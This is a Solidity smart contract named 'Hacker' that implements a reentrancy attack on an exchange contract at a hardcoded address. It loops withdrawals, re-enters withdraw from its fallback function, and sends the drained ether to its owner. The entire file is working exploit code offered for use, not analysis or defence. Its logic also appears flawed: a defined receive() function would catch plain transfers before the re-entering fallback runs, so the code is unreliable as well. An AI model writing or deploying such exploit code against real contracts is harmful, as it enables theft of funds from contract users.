// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IExchange {
    function deposit() external payable;
    function withdraw(address token, uint256 amount) external returns (bool success);
}

contract Hacker {
    IExchange public exchange;
    address public owner;

    // Constructor to initialize the contract with the address of the Exchange contract
    constructor() {
        exchange = IExchange(0x2a0c0DBEcC7E4D658f48E01e3fA353F44050c208);
        owner = msg.sender;
    }

    // Function to deposit ETH into the Hacker contract to cover gas fees
    function depositETHForGas() public payable {
        require(msg.value > 0, "Must send ETH to cover gas fees");
    }

    // Function to deposit ETH into the Exchange contract
    function depositToExchange() public payable {
        require(msg.value > 0, "Must send ETH to deposit into Exchange");
        exchange.deposit{value: msg.value}();
    }

    // Function to initiate the reentrancy attack with multiple transactions
    function attack(uint256 amount, uint256 iterations) public {
        require(msg.sender == owner, "Only owner can initiate the attack");
        for (uint256 i = 0; i < iterations; i++) {
            exchange.withdraw(0x0000000000000000000000000000000000000000, amount);
        }
    }

    // Receive function to handle plain Ether transfers
    receive() external payable {
        // Logic can be added here if needed
    }

    // Fallback function to handle reentrancy during the attack
    fallback() external payable {
        uint256 gasForReentry = gasleft() - 10000; // leave some gas for safety
        if (address(exchange).balance >= 1 ether) {
            (bool success,) = address(exchange).call{gas: gasForReentry}(
                abi.encodeWithSignature("withdraw(address,uint256)", 0x0000000000000000000000000000000000000000, address(this).balance)
            );
            require(success, "Reentrancy failed");
        }
    }

    // Function to collect remaining ETH after the attack
    function collectFunds() public {
        require(msg.sender == owner, "Only owner can collect funds");
        payable(owner).transfer(address(this).balance);
    }

    // Function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
